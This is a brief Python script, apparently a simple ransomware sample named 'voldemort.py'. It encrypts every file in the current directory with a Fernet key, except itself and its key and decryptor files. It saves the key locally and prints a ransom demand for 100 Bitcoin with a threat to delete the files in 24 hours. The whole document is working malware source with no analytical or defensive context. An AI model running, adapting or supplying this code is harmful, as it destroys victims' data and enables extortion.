#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files=[]

for file in os.listdir():
        #exclude own file and the file have the key
	if file=="voldemort.py" or file=="thekey.key" or file=="decrypt.py":
		continue
	#skip folders/directories
	if os.path.isfile(file):
		files.append(file)

key=Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)
for file in files:
	with open(file,"rb") as thefile:
		contents=thefile.read()
	encrypted_content=Fernet(key).encrypt(contents)
	with open(file,"wb") as thefile:
		thefile.write(encrypted_content)
print("All of your files have been encrypted!! Send me 100 Bitcoin or I'll delete them in 24 hours")

